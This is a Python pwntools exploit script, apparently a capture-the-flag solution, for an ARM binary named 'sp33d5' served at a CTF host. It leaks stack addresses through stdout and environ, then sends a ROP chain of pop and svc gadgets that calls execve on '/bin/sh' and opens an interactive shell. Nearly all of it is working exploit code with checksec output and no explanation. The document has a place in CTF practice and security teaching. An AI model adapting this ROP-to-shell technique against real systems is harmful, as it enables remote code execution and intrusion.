#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sp33d5'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'sp33d.play.hfsc.tf', 18088

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

break *0x1050e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ file sp33d5
# sp33d5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, BuildID[sha1]=de4dc5e2cc3e7fb5efe7a9a09df2c361a29a701d, for GNd
# └──╼ [★]$ pwn checksec sp33d5
#     Arch:     arm-32-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x10000)

def leak_stack():
    global io
    io = initialize()

    stdout = 0x7a7a8
    environ = 0x7df58
    for i in range(0, 17):
        io.sendline(str(1).encode())
    io.sendline(str(stdout).encode())
    io.sendline(str(0x1800).encode())
    for i in range(4):
        io.sendline(str(environ).encode())
    for i in range(4):
        io.sendline(str(environ+0x4).encode())

    io.sendline(str(0x0).encode()) # end

    io.interactive()

def exploit():
    global io
    io = initialize()

    leak = 0x407fff2c
    if args.REMOTE:
        leak = 0x40800e3c
    rip = leak - 0x160

    gadget = 0x000181c2 # pop {r0, r1, r3, r7, pc};
    # set_arg = 0x0003b600 # pop {r0, r4, pc};
    # set_nr = 0x00010448 # pop {r7, pc};
    syscall = 0x00010aa4 # svc #0; pop {r7, pc}

    for i in range(1, 17+1):
        io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(rip).encode())
    io.sendlineafter(b':', str(gadget+1).encode()) # pc
    io.sendlineafter(b':', str(leak-0x148).encode()) # r0
    io.sendlineafter(b':', str(elf.bss()).encode()) # r1
    io.sendlineafter(b':', str(elf.bss()).encode()) # r3
    io.sendlineafter(b':', str(11).encode()) # r7
    io.sendlineafter(b':', str(syscall+1).encode()) # pc
    io.sendlineafter(b':', str(u32(b'/bin')).encode())
    io.sendlineafter(b':', str(u32(b'/sh\x00')).encode()) 

    io.sendlineafter(b':', str(0x0).encode()) # end

    io.interactive()

if __name__ == '__main__':
    # leak_stack()
    exploit()
